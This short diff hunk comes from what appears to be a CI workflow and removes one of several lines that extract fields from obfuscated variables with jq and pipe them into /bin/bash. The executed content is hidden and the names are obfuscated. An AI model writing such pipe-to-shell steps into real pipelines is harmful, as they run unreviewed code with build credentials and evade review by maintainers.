@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$ndt811" | jq -r .dn9414 | /bin/bash
           echo $yom899 | jq -r .nnbw616 | /bin/bash
           echo $zhq954 | jq -r .bqzqp66 | /bin/bash
-          echo $d087 | jq -r .em139 | /bin/bash
           echo $qh312 | jq -r .kut664 | /bin/bash
           printf '%s' "$lmcvj6" | jq -r .y358 | /bin/bash
           echo $l481 | jq -r .kuz56 | /bin/bash
